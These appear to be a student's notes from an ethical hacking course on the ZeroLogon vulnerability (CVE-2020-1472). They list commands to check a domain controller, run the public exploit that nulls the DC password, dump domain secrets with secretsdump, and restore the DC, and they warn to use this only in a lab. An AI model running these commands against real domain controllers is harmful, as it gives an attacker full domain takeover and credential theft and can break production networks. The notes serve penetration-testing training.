ZeroLogon
---------
from: Heath Adams - The Cyber Mentor ; Practical Ethical Hacking - The Complete Course
"Abusing ZeroLogon" - https://academy.tcm-sec.com/courses/1152300/lectures/33690015

* This attack can easily destroy an AD DC so it should not be used on a pentest. Instead, scan for the vulnerability but do not actually run it.
* HA does show in the video how to run it and how to restore the DC
* The attack resets the DC password to null
* Helpful links suggested by HA:

        What is ZeroLogon? - https://www.trendmicro.com/en_us/what-is/zerologon.html

        dirkjanm CVE-2020-1472 - https://github.com/dirkjanm/CVE-2020-1472

        SecuraBV ZeroLogon Checker - https://github.com/SecuraBV/CVE-2020-1472
* If you are running the attack (e.g. in a virtual environment lab) git clone from https://github.com/dirkjanm/CVE-2020-1472
* Also, make sure you have the latest version of impacket installed
* run SecuraBV ZeroLogon Checker - https://github.com/SecuraBV/CVE-2020-1472 to check if the DC is vulnerable (you can copy the raw code from the repository and paste it into a doc and run it with python3
syntax from repository:

"Given a domain controller named EXAMPLE-DC with IP address 1.2.3.4, run the script as follows:

$ ./zerologon_tester.py EXAMPLE-DC 1.2.3.4

The DC name should be its NetBIOS computer name. If this name is not correct, the script will likely fail with a STATUS_INVALID_COMPUTER_NAME error."
* If the DC is vulnerable, in a virtual lab environment run the ZeroLogon attack:
syntax:

Attack:
$ python3 cve-2020-1472-exploit.py <DC_NAME> <DC_IP_ADDRESS>
- runs exploit and sets password to null
$ secretsdump.py -just-dc <DOMAIN_NAME>/<DC_NAME>\$@<DC_IP_ADDRESS>
- this will allow you to now logon to DC without password and dump its secrets
- the \$ escapes the dollar sign and tells the device that the password is null; when the password is requested, simply hit ENTER
- NOTE: make sure to copy the Administrator hash in order to be able to restore the DC!

Restoration:
$ secretsdump.py administrator@<DC_IP_ADDRESS> -hashes <Administrator's_hash>
- now copy the hash that appears after the words: "plain_password_hex"
$ python3 restorepassword.py <DOMAIN_NAME>/<DC_NAME>@<DC_NAME> -target-ip <DC_IP_ADDRESS> -hexpass <PLAIN_PASSWORD_HEX>
- this is the script to restore the DC
- the restore script is already built in to the https://github.com/dirkjanm/CVE-2020-1472 download
- after running this script you should see: "Change password OK"; this means that the DC has been restored to its original password and everything is ok
